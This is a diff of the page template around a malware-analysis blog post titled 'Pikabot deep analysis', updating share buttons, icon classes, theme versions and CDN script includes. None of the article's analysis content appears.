                             <a class="link-to-markdown" href="/pikabot/index.md" target="_blank">Read Markdown</a>
                         </span></div>
             <div class="post-info-share">
-                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis" data-via="0xd01a" data-hashtags="Malware Analysis,Reverse Engineering"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://d01a.github.io/pikabot/" data-hashtag="Malware Analysis"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="https://d01a.github.io/pikabot/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="https://d01a.github.io/pikabot/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@7.3.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Trello" data-sharer="trello" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis" data-description="Pikabot loader and core deep analysis"><i class="fab fa-trello fa-fw" aria-hidden="true"></i></a></span>
+                <span><a href="javascript:void(0);" title="Share on X" data-sharer="x" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis" data-via="0xd01a" data-hashtags="Malware Analysis,Reverse Engineering"><i class="fab fa-x-twitter" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Threads" data-sharer="threads" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-threads" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://d01a.github.io/pikabot/" data-hashtag="Malware Analysis"><i class="fab fa-facebook-square" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-hacker-news" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@16.9.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis"><i class="fab fa-weibo" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Diaspora" data-sharer="diaspora" data-url="https://d01a.github.io/pikabot/" data-title="Pikabot deep analysis" data-description="Pikabot loader and core deep analysis"><i class="fab fa-diaspora" aria-hidden="true"></i></a><a href="https://t.me/share/url?url=https%3a%2f%2fd01a.github.io%2fpikabot%2f&amp;text=Pikabot%20deep%20analysis" target="_blank" title="Share on Telegram"><i class="fab fa-telegram" aria-hidden="true"></i></a></span>
             </div>
         </div>
     </div>
 
     <div class="post-info-more">
-        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/malware-analysis/">Malware Analysis</a>,&nbsp;<a href="/tags/reverse-engineering/">Reverse Engineering</a></section>
+        <section class="post-tags"><i class="fas fa-tags" aria-hidden="true"></i>&nbsp;<a href="/tags/malware-analysis/">Malware Analysis</a>,&nbsp;<a href="/tags/reverse-engineering/">Reverse Engineering</a></section>
         <section>
             <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
         </section>
     </div>
 
-    <div class="post-nav"><a href="/aurora-stealer-builder/" class="prev" rel="prev" title="Aurora Stealer Builder"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Aurora Stealer Builder</a>
-            <a href="/syscalls/" class="next" rel="next" title="Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation">Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+    <div class="post-nav"><a href="/aurora-stealer-builder/" class="prev" rel="prev" title="Aurora Stealer Builder"><i class="fas fa-angle-left" aria-hidden="true"></i>Aurora Stealer Builder</a>
+            <a href="/syscalls/" class="next" rel="next" title="Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation">Understanding Syscalls: Direct, Indirect, and Cobalt Strike Implementation<i class="fas fa-angle-right" aria-hidden="true"></i></a></div>
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.102.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
-                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mohamed Adel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.161.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 1.0.0"><i class="far fa-kiss-wink-heart" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2026</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mohamed Adel</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
         <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
-                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
-            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
-                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+                <i class="fas fa-arrow-up" aria-hidden="true"></i>
             </a>
-        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@8.6.0/dist/index.umd.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"data":{"id-1":"d01a","id-2":"d01a"},"lightgallery":true,"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+        </div>
+
+        <div id="fixed-buttons-hidden"><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.2/sharer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/katex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/auto-render.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/copy-tex.min.js"></script><script src="https://cdn.jsdelivr.net/npm/katex@0.16.21/dist/contrib/mhchem.min.js"></script><script>window.config={"comment":{},"lightgallery":true,"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script src="/js/theme.js"></script></body>
 </html>
